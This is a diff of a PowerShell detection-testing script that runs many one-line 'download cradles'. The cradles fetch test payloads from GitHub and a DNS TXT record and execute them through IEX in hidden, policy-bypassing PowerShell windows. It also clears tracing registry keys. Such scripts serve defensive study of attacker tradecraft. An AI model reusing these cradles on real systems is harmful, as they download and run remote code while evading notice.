@@ -1,4 +1,4 @@
- <#
+<#
 .SYNOPSIS
 	Invoke-DownloadCradle.ps1 runs several single liner Download cradles.
 
@@ -26,11 +26,6 @@
 # Change this setting for http and https testing.
 $TLS = 1
 
-# Set version of TLS to use
-$TLSV = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
-
-
-
 # Null for no sleep between cradles. 10seconds otherwise
 $Sleep=$True
 
@@ -49,12 +44,12 @@ If ($TLS -eq 0){
 ElseIf ($TLS -eq 1){
     # Add https server details here... remember: it is not advised to run other peoples things form the internet!
     $Url = @(
-        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/static/other/DownloadCradle/payloads/test.ps1", # Basic Powershell Test script
+        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.ps1", # Basic Powershell Test script
         "test.dfir.com.au", # DNS text test - Powershell Test script base64 encoded in DNS txt field
-        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/static/other/DownloadCradle/payloads/test.xml", # Powershell embedded command
-        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/static/other/DownloadCradle/payloads/test.sct", # Powershell embedded scriptlet
-        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/static/other/DownloadCradle/payloads/mshta.sct", # Powershell embedded scriptlet
-        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/static/other/DownloadCradle/payloads/test.xsl" # Powershell embedded extensible Stylesheet Language
+        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.xml", # Powershell embedded command
+        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.sct", # Powershell embedded scriptlet
+        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/mshta.sct", # Powershell embedded scriptlet
+        "https://raw.githubusercontent.com/mgreen27/mgreen27.github.io/master/other/DownloadCradle/payloads/test.xsl" # Powershell embedded extensible Stylesheet Language
     )
 }
 
@@ -70,7 +65,6 @@ function Invoke-DownloadCradle
         [Parameter(Mandatory = $True)][String]$Type,
         [Parameter(Mandatory = $True)][String]$Command
         )
-
     
     # Clear cache and other relevant files
     Remove-Item -path HKLM:\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32 -Recurse -Force -ErrorAction SilentlyContinue
@@ -83,13 +77,12 @@ function Invoke-DownloadCradle
     if (Test-path $Outfile){Remove-Item $Outfile -Force}
     
     If ($Type -eq "Powershell"){
-        $command1 = -Join ($TLSV,";"," ", $command)
-        Try{powershell -exec bypass -windowstyle hidden -noprofile $command1}
+        Try{powershell -exec bypass -windowstyle hidden -noprofile $Command}
         Catch{$_}
     }
     ElseIf ($Type -eq "Regsvr32"){
         Try{
-            powershell -exec bypass -windowstyle hidden -noprofile  $Command
+            powershell -exec bypass -windowstyle hidden -noprofile $Command
             $(Get-Date -Format s) + " Success - see popup window!`n"
         }
         Catch{$_}
@@ -138,19 +131,16 @@ Invoke-DownloadCradle -Type Powershell -Command $Command
 
 
 "Powershell WebClient DownloadData"
-$Command = "WebClient DownloadString"
-$Command = " [System.Text.Encoding]::ASCII.GetString((New-Object Net.WebClient).DownloadData(`'" + $Url[0] + "`')) | IEX"
+$Command = "[System.Text.Encoding]::ASCII.GetString((New-Object Net.WebClient).DownloadData(`'" + $Url[0] + "`')) | IEX"
 Invoke-DownloadCradle -Type Powershell -Command $Command
 
 
 "Powershell WebClient OpenRead"
-$Command = "WebClient DownloadString"
 $Command = "`$sr=New-Object System.IO.StreamReader((New-Object Net.WebClient).OpenRead(`'" + $Url[0] + "`'));`$res=`$sr.ReadToEnd();`$sr.Close();`$res | IEX"
 Invoke-DownloadCradle -Type Powershell -Command $Command
 
 
 "Powershell WebClient DownloadFile"
-$Command = "WebClient DownloadString"
 $Command = "(New-Object Net.WebClient).DownloadFile(`'" + $Url[0] + "`'," + "`'" + $Outfile + "`'); GC `'" + $OutFile + "`' | IEX" 
 Invoke-DownloadCradle -Type Powershell -Command $Command
 
@@ -165,8 +155,7 @@ Else{"`tMethod supported on Powershell 3.0 and above only`n"}
 
 "Powershell Invoke-RestMethod"
 If ($PSVersionTable.PSVersion.Major -gt 2){
-    $Command = "WebClient DownloadString"
-$Command = "(`'" + $Url[0] + "`'|ForEach{(IRM (Variable _).Value)}) | IEX"
+    $Command = "(`'" + $Url[0] + "`'|ForEach{(IRM (Variable _).Value)}) | IEX"
     Invoke-DownloadCradle -Type Powershell -Command $Command
 }
 Else{"`tMethod supported on Powershell 3.0 and above only`n"}
@@ -210,7 +199,7 @@ Invoke-DownloadCradle -Type Powershell -Command $Command
 
 
 "Powershell Inline C#"
-$Command=" Add-Type 'using System.Net;public class Class{public static string Method(string url){return (new WebClient()).DownloadString(url);}}';IEX ([Class]::Method(`'" + $Url[0] + "`'))"
+$Command="Add-Type 'using System.Net;public class Class{public static string Method(string url){return (new WebClient()).DownloadString(url);}}';IEX ([Class]::Method(`'" + $Url[0] + "`'))"
 Invoke-DownloadCradle -Type Powershell -Command $Command
 
 
@@ -302,4 +291,4 @@ $webclient.DownloadString($Url) | Out-Null;"Fake .NET User-Agent completed"
 # Execution
 powershell -exec bypass -windowstyle hidden -noprofile $Command
 cmd /c
-#> 
+#>
